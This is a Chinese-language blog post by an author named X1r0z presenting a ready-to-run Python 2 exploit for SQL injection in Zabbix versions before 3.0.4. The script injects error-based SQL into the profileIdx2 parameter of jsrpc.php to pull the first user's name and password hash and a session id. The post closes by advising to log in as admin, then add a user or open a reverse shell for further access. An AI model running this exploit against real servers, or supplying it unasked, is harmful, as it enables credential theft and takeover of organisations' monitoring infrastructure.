---
title: "Zabbix SQL 注入"
date: 2018-04-04T00:00:00+08:00
draft: false
tags: ['zabbix','sqli']
categories: ['web']
author: "X1r0z"

# weight: 1  # Top page

# You can also close(false) or open(true) something for this content.
# P.S. comment can only be closed
comment: false
toc: false
autoCollapseToc: false
---

zabbix < 3.0.4 SQL Injection Exploit

<!--more-->

登录界面

![](http://exp10it-1252109039.cossh.myqcloud.com/2018/03/31/1522485897.jpg)

右键源代码 在 jsLoader.php 后面的为 zabbix 版本号

![](http://exp10it-1252109039.cossh.myqcloud.com/2018/03/31/1522485898.jpg)

## EXP

```
# -*- coding: utf-8 -*-

import urllib2
import sys, os
import re

def deteck_Sql():
    payload = "/jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&timestamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=999'&updateProfile=true&screenitemid=&period=3600&stime=20160817050632&resourcetype=17&itemids%5B23297%5D=23297&action=showlatest&filter=&filter_task=&mark_color=1"
    try:
        response = urllib2.urlopen(url + payload, timeout=10).read()
    except Exception,msg:
        print msg
    else:
        key_reg = re.compile(r"INSERT\s*INTO\s*profiles")
        if key_reg.findall(response):
            return True

def sql_Inject(sql):
    payload = url + "/jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&timestamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=" + urllib2.quote(
        sql) + "&updateProfile=true&screenitemid=&period=3600&stime=20160817050632&resourcetype=17&itemids[23297]=23297&action=showlatest&filter=&filter_task=&mark_color=1"
    try:
        response = urllib2.urlopen(payload, timeout=10).read()
    except Exception, msg:
        print msg
    else:
        result_reg = re.compile(r"Duplicate\s*entry\s*'~(.+?)~1")
        results = result_reg.findall(response)
        if results:
            return results[0]

if __name__ == '__main__':
    print 'Zabbix < 3.0.4 SQLi Exploit'
    print
    if len(sys.argv) != 2:
        print 'usage: ' + os.path.basename(sys.argv[0]) + ' url'
        sys.exit()
    url = sys.argv[1]
    if url[-1] != '/': url += '/'
    passwd_sql = "(select 1 from(select count(*),concat((select (select (select concat(0x7e,(select concat(name,0x3a,passwd) from  users limit 0,1),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)"
    session_sql = "(select 1 from(select count(*),concat((select (select (select concat(0x7e,(select sessionid from sessions limit 0,1),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)"
    if deteck_Sql():
        print 'password: %s' % sql_Inject(passwd_sql)
        print 'sessionid: %s' % sql_Inject(session_sql)
    else:
        print 'No SQL injection'
```

![](http://exp10it-1252109039.cossh.myqcloud.com/2018/03/31/1522485899.jpg)

登录 用户名 zabbix 或者 admin

![](http://exp10it-1252109039.cossh.myqcloud.com/2018/03/31/1522485902.jpg)

至于提权

root 权限 直接加用户

非 root 权限 反弹shell